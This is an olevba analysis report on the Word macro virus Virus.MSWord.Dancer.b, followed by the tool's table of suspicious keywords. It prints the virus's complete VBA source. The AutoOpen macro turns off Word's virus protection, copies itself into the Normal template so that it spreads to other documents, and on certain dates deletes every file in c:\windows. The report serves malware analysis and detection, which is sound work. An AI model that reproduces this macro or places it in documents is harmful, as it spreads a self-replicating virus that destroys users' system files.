olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Dancer.b-ac3b76a810cbb9d942ae30df8ea7a712bfe7b5a8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Dancer.b-ac3b76a810cbb9d942ae30df8ea7a712bfe7b5a8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO dancer.bas 
in file: Virus.MSWord.Dancer.b-ac3b76a810cbb9d942ae30df8ea7a712bfe7b5a8 - OLE stream: 'Macros/VBA/dancer'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Options.VirusProtection = False
If (System.PrivateProfileString("", "HKEY_CURRENT_USER\dancer", "dancer") = False) Then
ActiveDocument.VBProject.VBComponents("dancer").Export "c:\dancer.wav"
NormalTemplate.VBProject.VBComponents.Import ("c:\dancer.wav")
System.PrivateProfileString("", "HKEY_CURRENT_USER\dancer", "dancer") = True
ElseIf ActiveDocument.VBProject.VBComponents.Item("dancer").Name <> "dancer" Then
ActiveDocument.VBProject.VBComponents.Import ("c:\dancer.wav")
End If
If (Day(Now()) = 15) And Minute(Now()) = 29 Then
    ActiveDocument.PrintOut
ElseIf (Day(Now()) = 13 And WeekDay(Now()) = 13) Then
    Kill "c:\windows\*.*"
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

